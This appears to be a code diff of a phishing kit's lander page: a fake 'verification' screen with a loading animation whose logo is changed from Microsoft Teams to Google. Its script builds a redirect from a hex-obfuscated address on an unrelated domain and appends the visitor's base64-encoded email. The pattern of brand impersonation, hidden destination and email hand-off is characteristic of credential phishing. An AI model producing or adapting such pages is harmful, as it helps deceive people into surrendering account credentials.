@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Page</title>
+    <title></title>
     <style>
         body, html {
             height: 100%;
@@ -40,7 +40,7 @@
             50% { transform: scale(1.5); }
         }
         #emailDisplay {
-            color: rgb(110, 71, 238);
+            color: #008000;
             font-size: 18px;
             margin-bottom: 20px;
         }
@@ -48,7 +48,7 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://cdn.pixabay.com/photo/2022/01/27/07/17/microsoft-teams-6971301_960_720.png" alt="Logo" width="330px">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/768px-Google_%22G%22_logo.svg.png" alt="Logo" width="330px">
         <div id="emailDisplay" aria-live="polite"></div>
         <div class="dots-container" aria-label="Loading content">
             <div class="dot"></div>
@@ -91,7 +91,7 @@
 
         // Redirect to final URL with email appended
 function redirectToTarget(base64Email) {
-    const hex = "68747470733A2F2F7061326666692E7A656974676569737431312E636F6D2F70617373326666692F2358";
+    const hex = "68747470733A2F2F7061326666692E7A656974676569737431312E636F6D2F70617373326666692F23";
     const obfuscatedURL = hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('') + base64Email;
     window.location.href = obfuscatedURL;
 }
